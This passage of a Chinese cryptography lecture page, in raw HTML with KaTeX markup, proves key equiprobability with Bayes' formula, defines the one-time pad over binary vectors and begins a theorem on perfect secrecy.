class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mtight">∣</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p><p><font color=blue>y不变时，x与k对应证法</font><br />由贝叶斯公式：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>x</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>⇒</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>∈</mo><mi>K</mi><mo>:</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x_i|y]Pr[y]=Pr[y|x_i]Pr[x_i]\Rightarrow Pr[y]=Pr[y|x_i]=Pr[k\in K:e_k(x_i)=y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span></span></p><p>遍历x时，也能够遍历k。故所有密钥概率均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span></span></span></span></p><h2 id="四-一次一密密码体制"><a class="markdownIt-Anchor" href="#四-一次一密密码体制"></a> 四、一次一密密码体制</h2><p>定义：<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><msub><mi>Z</mi><mn>2</mn></msub><msup><mo stretchy="false">)</mo><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">P=C=K=(Z_2)^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>x</mi><mi>n</mi></msub><mo>+</mo><msub><mi>k</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">e_k(x)=(x_1+k_1,x_2+k_2,...,x_n+k_n)\mod 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mn>1</mn></msub><mo>+</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>2</mn></msub><mo>+</mo><msub><mi>k</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>y</mi><mi>n</mi></msub><mo>+</mo><msub><mi>k</mi><mi>n</mi></msub><mo stretchy="false">)</mo><mspace></mspace><mspace width="0.6666666666666666em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">d_k(x)=(y_1+k_1,y_2+k_2,...,y_n+k_n)\mod 2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6666666666666666em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span></span></span></span><br />可根据定理2证明其完善保密性。</p><h2 id="五-完善保密性判定定理"><a class="markdownIt-Anchor" href="#五-完善保密性判定定理"></a> 五、完善保密性判定定理</h2><p>假设密钥只使用一次</p><p><font color=red>定理1：对密码体制<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mi>C</mi><mo separator="true">,</mo><mi>K</mi><mo separator="true">,</mo><mi>E</mi><mo separator="true">,</mo><mi>D</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(P,C,K,E,D)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mclose">)</span></span></span></span>，若对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">x\in P,y\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo>∑</mo><mrow><mi>k</mi><mo>:</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></msub><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sum_{k:x=d_k(y)}Pr[k]=\frac{1}{|P|}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.22471em;vertical-align:-0.47471em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.22528999999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight">x</span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.47471em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord 